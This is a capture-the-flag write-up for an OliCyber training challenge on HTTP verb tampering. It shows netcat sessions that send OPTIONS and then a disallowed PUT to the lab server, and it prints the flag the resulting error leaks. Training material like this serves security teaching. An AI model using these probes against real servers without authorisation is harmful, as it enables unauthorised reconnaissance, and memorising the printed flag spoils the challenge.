# URL
https://training.olicyber.it/challenges#challenge-349

# Concept
Sometimes it can be interesting to intentionally try using an unsupported verb. Normally, a server should handle unsupported requests gracefully, but if there are misconfigurations or programming errors, using an unexpected method can cause a crash. Crashes, and more generally, unexpected operations, can reveal interesting information that is hidden in the normal use of a web service.

# Method of Solve
- Go to the challenge interface and Copy the target URL
- perform a request to the URL using the OPTIONS method
- This reveals the options that are allowed on the website URL for requests
  ```
    └─$ nc web-10.challs.olicyber.it 80   
        OPTIONS / HTTP/1.1
        Host: web-10.challs.olicyber.it
        
        HTTP/1.1 401 Unauthorized
        Allow: HEAD, OPTIONS, GET
        Content-Length: 0
        Content-Type: text/html; charset=utf-8
        Date: Tue, 03 Feb 2026 13:00:34 GMT
        Server: nginx/1.21.6
        
        
        GET
        HTTP/1.1 400 Bad Request
        Content-Type: text/plain; charset=utf-8
        Connection: close
        
        400 Bad Request
  ```
- Now lets try giving it a request that is not allowed on the server, let's say .. **PUT**
  ```
    └─$ nc web-10.challs.olicyber.it 80
        PUT / HTTP/1.1
        Host: web-10.challs.olicyber.it
              
        HTTP/1.1 500 Internal Server Error
        Content-Length: 21
        Content-Type: text/plain; charset=utf-8
        Date: Tue, 03 Feb 2026 13:04:49 GMT
        Server: nginx/1.21.6
        X-Flag: flag{br34king_7h3_ru135}
        
        Internal server error
  ```
- And hence we get the flag
- The flag is **flag{br34king_7h3_ru135}**
